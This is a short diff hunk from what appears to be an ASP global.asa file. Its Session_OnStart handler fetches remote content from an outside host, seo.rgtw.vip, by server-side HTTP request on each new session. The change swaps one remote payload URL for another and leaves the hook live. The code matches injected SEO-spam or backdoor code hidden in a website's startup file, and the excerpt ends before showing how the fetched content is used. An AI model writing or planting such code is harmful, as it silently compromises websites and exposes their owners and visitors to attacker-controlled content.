@@ -4,7 +4,7 @@ end sub
 sub Application_OnEnd
 end sub
 sub Session_OnStart
-	url="http://seo.rgtw.vip/Remotecode.txt"
+	url="http://seo.rgtw.vip/Rewritecode.txt"
 	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
 	ObjXMLHTTP.Open "GET",url,False
 	ObjXMLHTTP.setRequestHeader "User-Agent",url
